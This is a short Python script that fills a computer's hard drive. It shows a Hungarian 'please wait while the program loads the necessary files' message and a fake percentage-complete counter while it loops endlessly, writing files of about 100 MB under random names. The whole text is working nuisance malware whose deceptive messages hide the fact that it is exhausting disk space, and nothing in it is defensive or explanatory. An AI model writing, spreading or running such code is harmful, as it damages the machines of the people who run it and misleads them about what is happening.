import random

# rapid file writing on the hard drive

print("Kérem várjon amíg a rogram betölti a szükséges fájlokat...")

def spammer(tart):
    name = random.randrange(1, 100000000000000000000000000)
    file = open(str(name), "w")
    file.write(str(tart))
    file.close

tart = []
while len(tart) < 102:
    tart.append(' ' * 10**6)

percent = 0
output = 100
while True:
    spammer(tart)
    percent += 10
    if percent > output:
        print (output/10, "% kész!")
        output += 100
